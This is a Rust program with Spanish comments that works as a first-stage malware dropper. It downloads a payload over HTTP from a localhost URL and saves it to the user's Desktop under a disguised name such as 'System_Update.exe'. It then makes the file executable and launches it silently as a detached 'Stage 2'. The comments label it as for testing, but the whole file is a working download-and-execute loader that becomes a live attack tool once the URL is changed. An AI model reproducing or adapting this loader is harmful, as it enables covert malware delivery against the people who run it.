use std::fs::File;
use std::io::Write;
use std::process::Command;
use std::process::Stdio;
use std::env;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // 1. Descargar el payload (localhost)
    let url = "http://localhost:8080/payload";
    println!("📥 Descargando payload desde: {}", url);

    let response = reqwest::blocking::get(url)?;
    let bytes = response.bytes()?;
    println!("✅ Payload descargado ({} bytes)", bytes.len());

    // 2. Guardar en el Escritorio (más visible para pruebas)
    let desktop = match env::consts::OS {
        "windows" => env::var("USERPROFILE")? + "\\Desktop",
        "macos" => env::var("HOME")? + "/Desktop",
        "linux" => env::var("HOME")? + "/Desktop",
        _ => env::temp_dir().to_str().unwrap().to_string(),
    };

    let filename = match env::consts::OS {
        "windows" => "System_Update.exe",
        "macos" => "System_Update.dmg",
        "linux" => "System_Update.deb",
        _ => "System_Update.bin",
    };

    let path = format!("{}/{}", desktop, filename);
    let mut file = File::create(&path)?;
    file.write_all(&bytes)?;
    println!("✅ Archivo guardado en: {}", path);

    // 3. EJECUTAR INMEDIATAMENTE (para pruebas)
    #[cfg(target_os = "windows")]
    {
        println!("🚀 Ejecutando payload...");
        Command::new(&path)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;
    }

    #[cfg(any(target_os = "macos", target_os = "linux"))]
    {
        use std::os::unix::fs::PermissionsExt;

        let mut perms = std::fs::metadata(&path)?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&path, perms)?;

        println!("🚀 Ejecutando payload...");

        // Desvincular el proceso del Stage 1 para que no muera
        Command::new(&path)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;
    }

    println!("✅ Stage 2 ejecutándose en background");
    Ok(())
}
